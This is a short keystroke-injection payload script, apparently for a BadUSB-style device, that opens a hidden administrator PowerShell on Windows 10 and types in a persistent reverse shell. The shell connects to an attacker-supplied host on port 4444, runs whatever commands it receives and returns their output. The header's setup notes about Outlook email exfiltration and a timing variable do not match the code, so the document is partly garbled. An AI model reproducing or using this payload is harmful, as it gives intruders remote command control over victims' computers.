// =============================================================================
// Title: Simple NetCat Client
// Author: @beigeworm | https://github.com/beigeworm
// Description: Uses Powershell to start a Netcat client that stays open until the system is restarted.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// exfil lootchest [REQUIRERD]

// *REQUIREMENTS*
// you will need a Microsoft Outlook Email address for this to work

// *SETUP*
// replace YOUR_EMAIL and YOUR_PASSWORD. (check entire script)
// set $runtime=1 to desired interval beetween emails (in minutes). Default is 1 minute.

// =============================================================================

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -W Hidden -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(3000);
press("ALT y");
delay(4000);

// Main Powershell code
type("do{;$v = 4;$a = New-Object SyStem.NeT.sockeTs.TCPClieNt(\"YOUR_IP_OR_DOMAIN_HERE\",4444)");
press("ENTER");
delay(500);
type(";$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($d = $b.Read($c, 0, $c.Length)) -ne 0){;$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d)");
press("ENTER");
delay(500);
type(";$f = (iex $e 2>&1 | Out-String );$g = $f + (pwd).Path + '> ';$h = ([text.encoding]::ASCII).GetBytes($g);$b.Write($h,0,$h.Length);$b.Flush()};$a.Close();Sleep 10}while ($v -le 5)");
press("ENTER");
delay(500);
